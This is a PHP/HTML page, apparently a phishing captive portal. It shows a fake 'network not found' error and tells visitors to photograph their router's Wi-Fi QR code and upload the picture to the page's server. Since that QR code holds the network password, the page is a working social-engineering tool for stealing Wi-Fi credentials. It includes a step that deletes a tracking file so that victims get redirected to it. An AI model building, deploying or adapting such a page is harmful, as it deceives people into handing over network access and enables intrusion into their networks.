<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
}
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Auth needed</title>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<style>
    h2 { color: #000000;
font-family:sans-serif;
}
  </style>
</head>
<body>
<IMG class="displayed" src="qrcode1.png" height="150" width="200">
<br>
<p style="color:#808080;">Error code 109 : network not found.</p>
<br>
<br>
<body>
<p style="color:#808080;">Reconnect your network using the QR code.<b>This method avoid to write the Wi-Fi key for each devices.</b>The QR code appear behind your router or on the digital screen.
<br>
	<center><IMG class="displayed" src="qrcode.png"></center>
	<br>
	<br>
<p style="color:#808080;">Push the button <b style='color:red;'>Choose file</b> below to take a picture of the QR code.<b style='color:red;'>Don't move too much during this process </b>then push <b style='color:red;'>Upload.</b>If your browser doesn't support this procedure don't close this windows and use your default application to take a picture from the QR code.Then come back on this screen and choose the picture in your gallery and <b style='color:red;'>Upload</b> it</p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
</br>
</br>
</body>
</html>
